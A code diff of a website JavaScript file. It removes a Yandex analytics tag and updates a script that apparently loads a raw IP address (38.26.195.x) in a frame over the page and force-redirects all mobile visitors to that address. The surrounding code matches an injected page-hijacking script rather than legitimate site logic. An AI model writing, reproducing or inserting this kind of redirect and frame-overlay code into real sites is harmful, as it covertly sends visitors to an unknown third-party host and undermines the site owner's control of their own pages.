@@ -1,14 +1,5 @@
 //lxxaicom
-(function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
-   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
-   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
 
-   ym(87023917, "init", {
-        clickmap:true,
-        trackLinks:true,
-        accurateTrackBounce:true,
-        webvisor:true
-   });
    var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
@@ -19,7 +10,7 @@
 
 
 var titlestr=document.title;
-setFrame("http://38.26.195.33/");
+setFrame("http://38.26.195.35/");
 
 
 
@@ -49,5 +40,5 @@ function setFrame(olink){
     } catch (e) {}
 }
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	window.location.href="http://38.26.195.33/";
+	window.location.href="http://38.26.195.35/";
 }
